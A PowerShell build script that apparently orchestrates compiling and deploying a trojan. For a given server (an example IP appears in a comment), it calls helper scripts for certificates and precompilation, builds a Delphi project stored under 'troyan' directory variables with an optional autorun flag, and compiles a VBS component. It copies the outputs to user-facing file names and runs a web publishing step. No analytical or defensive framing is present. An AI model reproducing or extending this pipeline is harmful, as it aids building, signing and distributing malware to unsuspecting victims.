param (
    [string]$serverName, [string]$action = "apply"
)
#$serverName="185.247.141.76"
#$action = "exe"
if ([string]::IsNullOrEmpty($serverName))
{
    throw "compile.ps1 -serverName argument is null"
}


#refine
$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
Set-Location -Path $scriptDir
& (Join-Path -Path $scriptDir -ChildPath "./compile.refiner.ps1") -serverName $serverName

#currents
Set-Location -Path $scriptDir
. ".\current.ps1" -serverName $serverName
if ([string]::IsNullOrEmpty($server.rootDir)) {
    throw "compile1.ps1 - server is not linked"
}

#cert
& (Join-Path -Path $scriptDir -ChildPath "./compile.cert.ps1") -serverName $serverName


#precompile
& (Join-Path -Path $server.troyanDelphiDir -ChildPath "./precompile.ps1") -serverName $serverName

#compile
$dprOpts = "NO_AUTORUN"
if ($server.autoStart)
{
    $dprOpts = "USE_AUTORUN"
}
$dcc32Path = "C:\Program Files (x86)\Borland\Delphi7\Bin\dcc32.exe"
$dprFile = $server.troyanDelphiProj
$dprArgs = "-D`"$dprOpts`" `"$dprFile`""
Set-Location -Path $server.troyanDelphiDir
Start-Process -FilePath "`"$dcc32Path`"" -ArgumentList $dprArgs -Wait
Set-Location -Path $scriptDir
Copy-Item -Path $server.troyanDelphiExe -Destination $server.userDelphiExe -Force


#precompileVBS
& (Join-Path -Path $server.troyanVbsDir -ChildPath "./vbscompile.ps1") -serverName $serverName
Copy-Item -Path $server.troyanVbsFile -Destination $server.userVbsFile -Force


if ($action -eq "apply")
{
    #web
    & (Join-Path -Path $scriptDir -ChildPath "./compile.web.ps1") -serverName $serverName
}
Write-Host "Compile complete"